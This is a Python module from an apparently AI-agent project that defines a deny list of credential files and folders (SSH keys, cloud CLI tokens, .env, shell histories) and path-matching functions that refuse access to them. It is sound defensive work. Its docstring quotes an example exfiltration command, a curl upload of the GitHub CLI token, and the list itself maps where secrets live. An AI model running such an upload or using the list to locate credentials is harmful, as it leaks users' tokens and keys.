"""The one list of file and folder names that hold credentials.

Three places refuse a credential file, and each had its own list until the audit of 2026-11 (a07-02)
measured them apart: the bridge's file views (``chimera/api/bridge_routes.is_secret_file``), the
permission switch's floor (``chimera/governance/bypass.py``, which reads the bridge's), and the remote
file tools over SSH (``chimera/tools/ssh_remote.py``). On the same five paths they disagreed:
``.kube/config`` and ``.docker/config.json`` were refused over SSH and not by the bridge,
``service.token`` the other way round, and the GitHub CLI's token (``.config/gh/hosts.yml``) and the
Azure CLI's (``.azure/accessTokens.json``) by neither. So with "Ignore permissions" on,
``curl -T ~/.config/gh/hosts.yml https://...`` was released without a card.

All three read this module now. Two kinds of entry:

- :data:`CREDENTIAL_NAME_GLOBS` names ONE path component. A folder named here is refused whole
  (``.ssh``, ``.aws``, ``.kube``, ``.docker``, ``.azure``, ``.gnupg``): what is inside is keys and
  tokens, and refusing the folder needs no list of the files a tool may add to it next year.
- :data:`CREDENTIAL_PATH_SEQUENCES` names consecutive components, for a credential that lives in a
  folder whose name alone says nothing: ``gh/hosts.yml`` (a folder called ``gh`` in a project is
  ordinary; the file ``hosts.yml`` in it is the GitHub token), the gcloud token stores, ``hub``.

Names are compared lower-cased, and each component also as Windows opens it
(:func:`chimera.core.own_files.normal_name`: ``.env.``, ``.env `` and ``.env::$DATA`` are ``.env``).
The lists only ever grow: an entry taken out is a credential a tool starts handing over again.
"""

from __future__ import annotations

import fnmatch
import re

#: One path component that names a credential file or folder. Lower case, and only characters that
#: are safe inside a POSIX ``case`` pattern and a ``grep --exclude`` (the SSH tools put them there, on
#: the remote host, so a secret there is never even read).
CREDENTIAL_NAME_GLOBS: tuple[str, ...] = (
    # Environment files and private keys.
    ".env*", "*.pem", "*.key", "*.p12", "*.pfx", "*.keystore", "*.jks",
    "id_rsa*", "id_dsa*", "id_ecdsa*", "id_ed25519*",
    # Login and package-registry credentials.
    ".ssh", "credentials*", ".netrc", ".pypirc", ".npmrc", ".git-credentials",
    "secret", "secrets", "secret.*", "secrets.*",
    # Chimera's own: the service's record and token are the owner's whole API
    # (`chimera/core/service_record.py`), the launcher record names the environment it starts with.
    "desktop-bridge.json", "service-stable.json", "service-dev.json", "service.token",
    "desktop-install.json",
    # Cloud, cluster and signing credential folders, refused whole.
    ".gnupg", ".aws", ".kube", ".docker", ".azure",
    # Histories hold whatever was typed, passwords included; Terraform state stores secrets in clear.
    ".bash_history", ".zsh_history", ".python_history", "*.tfstate", "*.tfstate.backup",
)

#: Consecutive path components that name a credential where no single component does. Lower case.
CREDENTIAL_PATH_SEQUENCES: tuple[tuple[str, ...], ...] = (
    ("gh", "hosts.yml"),  # GitHub CLI token, ~/.config/gh/hosts.yml
    ("github cli", "hosts.yml"),  # the same file on Windows, %APPDATA%\GitHub CLI\hosts.yml
    (".config", "hub"),  # the old `hub` CLI keeps its OAuth token in this one file
    ("glab-cli", "config.yml"),  # GitLab CLI token
    ("gcloud", "credentials.db"),
    ("gcloud", "access_tokens.db"),
    ("gcloud", "legacy_credentials"),
    ("gcloud", "application_default_credentials.json"),
)

_SAFE_GLOB = re.compile(r"[a-z0-9._*-]+")
assert all(_SAFE_GLOB.fullmatch(glob) for glob in CREDENTIAL_NAME_GLOBS)  # safe in a `case` pattern
assert all(part == part.lower() and "/" not in part for seq in CREDENTIAL_PATH_SEQUENCES for part in seq)


def _spellings(part: str) -> set[str]:
    """``part`` lower-cased, raw and as Windows opens it (see :func:`chimera.core.own_files.normal_name`)."""
    from chimera.core.own_files import normal_name

    lowered = part.lower()
    return {lowered, normal_name(lowered) or lowered, lowered.rstrip(" .") or lowered}


def is_credential_name(part: str) -> bool:
    """Whether ONE path component names a credential file or folder."""
    return any(
        fnmatch.fnmatchcase(spelling, glob) for spelling in _spellings(part) for glob in CREDENTIAL_NAME_GLOBS
    )


def _components(path: str) -> list[str]:
    return [part for part in re.split(r"[\\/]+", str(path)) if part]


def credential_part(path: str) -> str | None:
    """The first component, or run of components, of ``path`` that names a credential; else ``None``.

    Splits on both separators, because the bridge and the switch read Windows paths and the remote
    tools POSIX ones, and a path written with the other separator is the same file.
    """
    for part in _components(path):
        if is_credential_name(part):
            return part
    return credential_sequence_part(path)


def credential_sequence_part(path: str) -> str | None:
    """The first run of components of ``path`` listed in :data:`CREDENTIAL_PATH_SEQUENCES`, or ``None``.

    Read on the path as written AND on its lexical normal form: ``gh/./hosts.yml``,
    ``gh/x/../hosts.yml`` and ``gh/.  /hosts.yml`` (Windows opens ``.  `` as ``.``) are the file
    ``gh/hosts.yml``, and the run only matched consecutive components as written (review of the
    P0-01/02 fix). Both readings, so normalising can only add a match, never take one away.
    """
    for parts in (_components(path), _normal_components(path)):
        spelled = [_spellings(part) for part in parts]
        for sequence in CREDENTIAL_PATH_SEQUENCES:
            width = len(sequence)
            for start in range(len(parts) - width + 1):
                if all(sequence[i] in spelled[start + i] for i in range(width)):
                    return "/".join(parts[start:start + width])
    return None


def _normal_components(path: str) -> list[str]:
    """The components with ``.`` dropped and ``..`` taken back, as a path is resolved lexically."""
    from chimera.core.own_files import normal_name

    parts: list[str] = []
    for part in _components(path):
        # `..` first: Windows' reading drops trailing dots, so `..` itself opens as "".
        if part.rstrip(" ") == "..":
            if parts:
                parts.pop()
            continue
        if normal_name(part) in {"", "."}:
            continue
        parts.append(part)
    return parts


def is_credential_path(path: str) -> bool:
    """Whether any component, or run of components, of ``path`` names a credential."""
    return credential_part(path) is not None
